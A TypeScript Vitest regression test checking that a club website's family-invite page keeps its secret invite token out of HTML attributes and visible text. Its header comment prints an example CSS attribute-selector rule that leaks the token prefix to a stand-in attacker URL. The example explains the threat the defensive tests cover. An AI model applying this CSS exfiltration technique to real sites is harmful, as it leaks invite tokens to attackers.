// @vitest-environment jsdom

import type { ReactNode } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { beforeEach, describe, expect, it, vi } from "vitest";

/**
 * #2827 — the invite token must not reach a CSS-selectable attribute on the
 * family-invite page.
 *
 * This is a `(public)` route, so it renders the club's normal chrome, which
 * injects the admin-authored **Raw CSS** from Site Appearance. A CSS attribute
 * selector reads a value one character at a time:
 *
 *     a[href^="/family-invite/e7c1b9"] { background: url(https://attacker/e7c1b9); }
 *
 * The page used to build its sign-in link as
 * `buildLoginPath('/family-invite/<token>')`, so that link was an invite-token
 * oracle for anyone who can edit the site's styling. Both affordances are plain
 * `/login` anchors now, and the post-login return address travels in the HttpOnly
 * cookie `src/lib/family-invite-return-address.ts` documents.
 *
 * Two branches render such a link and both are covered: the signed-out branch,
 * and the wrong-account branch a signed-in visitor reaches when the invite was
 * sent to somebody else. The wrong-account branch matters independently — it is
 * the one a forwarded link lands on, so it is the one an attacker can reach with
 * a session of their own.
 */

/** A realistic 64-hex action token, with no repeating run, so a short prefix of
 * it is distinctive enough that finding one in an attribute means a real leak
 * rather than a coincidental class-name collision. */
const TOKEN =
  "e7c1b93a5d0f4826" + "1af74c02be95d738" + "6b0d2e8149a3fc57" + "d4938e6017c2ba5f";

/** The shortest prefix an attacker needs to start a working `^=` oracle. */
const ORACLE_PROBE_LENGTH = 6;

const { mockAuth, mockInviteView, mockMemberFindUnique } = vi.hoisted(() => ({
  mockAuth: vi.fn(),
  mockInviteView: vi.fn(),
  mockMemberFindUnique: vi.fn(),
}));

vi.mock("@/lib/auth", () => ({ auth: () => mockAuth() }));

vi.mock("@/lib/partner-invite-token", () => ({
  getPartnerInviteTokenForClaim: (token: string) => mockInviteView(token),
}));

vi.mock("@/lib/prisma", () => ({
  prisma: {
    member: { findUnique: (...args: unknown[]) => mockMemberFindUnique(...args) },
  },
}));

vi.mock("@/lib/public-layout-config", () => ({
  getCachedClubIdentity: async () => ({ name: "Test Alpine Club" }),
}));

vi.mock("next/link", () => ({
  default: ({ href, children, ...rest }: { href: unknown; children: ReactNode }) => (
    <a href={String(href)} {...rest}>
      {children}
    </a>
  ),
}));

// The claim card is a client component with its own suite; render it as a marker
// so this suite measures the page's own markup. It legitimately receives the
// token as a prop — see the last case for why that is not the same exposure.
vi.mock("@/components/partner-invite-claim-card", () => ({
  PartnerInviteClaimCard: () => <div data-testid="claim-card" />,
}));

import PartnerInvitePage from "../page";

function claimableView(overrides: Record<string, unknown> = {}) {
  return {
    status: "claimable",
    invitedEmail: "invited@example.com",
    groupName: "The Smiths",
    familyGroupId: "fg-1",
    createPartnerLink: false,
    inviterName: "Jo Smith",
    ...overrides,
  };
}

async function renderPage() {
  const markup = renderToStaticMarkup(
    await PartnerInvitePage({ params: Promise.resolve({ token: TOKEN }) }),
  );
  const host = document.createElement("div");
  host.innerHTML = markup;
  return { markup, host };
}

/** Every attribute value in the rendered tree, root element included. */
function everyAttributeValue(root: Element): { name: string; value: string }[] {
  const elements = [root, ...Array.from(root.querySelectorAll("*"))];
  return elements.flatMap((element) =>
    Array.from(element.attributes).map((attribute) => ({
      name: `<${element.tagName.toLowerCase()} ${attribute.name}>`,
      value: attribute.value,
    })),
  );
}

function expectNoTokenAnywhere(markup: string, host: Element) {
  const probe = TOKEN.slice(0, ORACLE_PROBE_LENGTH);

  for (const attribute of everyAttributeValue(host)) {
    // Asserted on the PREFIX, not the whole token: exfiltration is
    // prefix-by-prefix, so an attribute holding the first few characters already
    // hands an attacker a working `^=` oracle to extend.
    expect(attribute.value, `${attribute.name} carries the invite token`).not.toContain(
      probe,
    );
  }

  expect(markup).not.toContain(TOKEN);
  expect(markup).not.toContain(encodeURIComponent(TOKEN));
  expect(host.textContent ?? "").not.toContain(probe);
}

beforeEach(() => {
  vi.clearAllMocks();
  mockInviteView.mockResolvedValue(claimableView());
});

describe("family-invite page — the invite token stays out of the markup (#2827)", () => {
  it("offers a signed-out visitor a plain /login link with no callbackUrl", async () => {
    mockAuth.mockResolvedValue(null);

    const { host } = await renderPage();
    const signIn = Array.from(host.querySelectorAll("a")).find((anchor) =>
      (anchor.textContent ?? "").includes("I already have an account"),
    );

    expect(signIn, "the sign-in affordance must survive the fix").toBeTruthy();
    // Exact, not a prefix match: `/login?callbackUrl=…` is the shape this fix
    // removes and the shape a future edit would most plausibly reintroduce.
    expect(signIn?.getAttribute("href")).toBe("/login");
  });

  it("puts the token in NO attribute and no visible text when signed out", async () => {
    mockAuth.mockResolvedValue(null);

    const { markup, host } = await renderPage();

    expectNoTokenAnywhere(markup, host);
  });

  it("keeps it a real anchor, so the flow survives with JavaScript off", async () => {
    // The owner's requirement for this rework. A button with an onClick handler
    // would have closed the oracle and quietly dropped the no-JavaScript path;
    // an anchor to a static address needs no script at all, and the return
    // address rides on the response that rendered it.
    mockAuth.mockResolvedValue(null);

    const { host } = await renderPage();
    const signIn = Array.from(host.querySelectorAll("a")).find((anchor) =>
      (anchor.textContent ?? "").includes("I already have an account"),
    );

    expect(signIn?.tagName).toBe("A");
    expect(signIn?.getAttribute("href")).toBeTruthy();
  });

  it("does the same on the wrong-account branch a forwarded link reaches", async () => {
    mockAuth.mockResolvedValue({ user: { id: "member-1" } });
    mockMemberFindUnique.mockResolvedValue({ email: "someone.else@example.com" });

    const { markup, host } = await renderPage();
    const signIn = Array.from(host.querySelectorAll("a")).find((anchor) =>
      (anchor.textContent ?? "").includes("Sign in with a different account"),
    );

    expect(signIn?.getAttribute("href")).toBe("/login");
    expectNoTokenAnywhere(markup, host);
  });

  it("still refuses the wrong signed-in email — the check this fix does not replace", async () => {
    // Defence in depth, and load-bearing for the cookie's threat model: a value
    // planted by an attacker, or left in a shared browser, can only land somebody
    // on an invite page. This is what stops them joining the group from there.
    mockAuth.mockResolvedValue({ user: { id: "member-1" } });
    mockMemberFindUnique.mockResolvedValue({ email: "someone.else@example.com" });

    const { host } = await renderPage();

    expect(host.textContent).toContain("This invitation was sent to");
    expect(host.querySelector('[data-testid="claim-card"]')).toBeNull();
  });

  it("admits the invited member, whose claim card legitimately holds the token", async () => {
    // The matching-email branch is the one authorised visitor, and the claim card
    // is a client component that needs the token to POST the claim. That is a
    // React prop in the flight payload, not a rendered attribute, so no CSS
    // selector can read it — which is why this suite asserts on attributes and
    // text rather than on the whole document.
    mockAuth.mockResolvedValue({ user: { id: "member-1" } });
    mockMemberFindUnique.mockResolvedValue({ email: "invited@example.com" });

    const { host } = await renderPage();

    expect(host.querySelector('[data-testid="claim-card"]')).not.toBeNull();
  });
});
